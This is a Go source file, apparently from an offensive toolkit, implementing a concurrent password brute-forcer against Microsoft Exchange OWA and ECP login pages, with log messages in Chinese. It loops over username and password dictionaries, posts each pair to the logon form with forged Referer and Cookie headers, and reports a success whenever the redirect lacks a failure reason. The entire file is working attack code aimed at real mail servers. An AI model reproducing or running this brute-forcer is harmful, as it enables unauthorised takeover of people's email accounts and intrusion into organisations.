package lib

import (
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

func HttpBruteWorker(targetUrl string, mode string, u string, domain string, task chan []string, delay int) {

	var refUrl string
	if mode == "owa" {
		refUrl, _ = url.JoinPath(targetUrl, "/owa/")
	} else {
		refUrl, _ = url.JoinPath(targetUrl, "/ecp/")
	}
	referer, _ := url.JoinPath(targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refUrl)

	for data := range task {
		username, password := data[0], data[1]
		Log.Debug("[*] 尝试: %v:%v", username, password)
		form := url.Values{
			"destination":    {refUrl},
			"flags":          {"4"},
			"forcedownlevel": {"0"},
			"username":       {domain + "\\" + username},
			"password":       {password},
			"passwordText":   {""},
			"isUtf8":         {"1"},
		}
		req, _ := http.NewRequest("POST", u, strings.NewReader(form.Encode()))
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Referer", referer)
		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
		req.Header.Set("Connection", "close")

		res, _ := Client.Do(req)
		location := res.Header.Get("Location")

		if location == "" {
			Log.Failed("[-] 失败: %v", username+":"+password)
		} else if !strings.Contains(location, "reason") {
			Log.Success("[+] 成功: %v", username+":"+password)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(delay))
	}
}

func HttpBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int, delay int) {

	authPath := ExchangeUrls[mode]
	u, _ := url.JoinPath(targetUrl, authPath)
	Log.Info("[*] 使用 %v 接口爆破: %v", mode, targetUrl)

	task := make(chan []string, len(userDict)*len(passDict))

	t1 := time.Now()

	for _, username := range userDict {
		for _, password := range passDict {
			data := []string{username, password}
			task <- data
		}
	}
	close(task)

	var wg sync.WaitGroup

	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			HttpBruteWorker(targetUrl, mode, u, domain, task, delay)
		}()
	}

	wg.Wait()

	t2 := time.Now()
	Log.Info("[*] 耗时: %v", t2.Sub(t1))
}
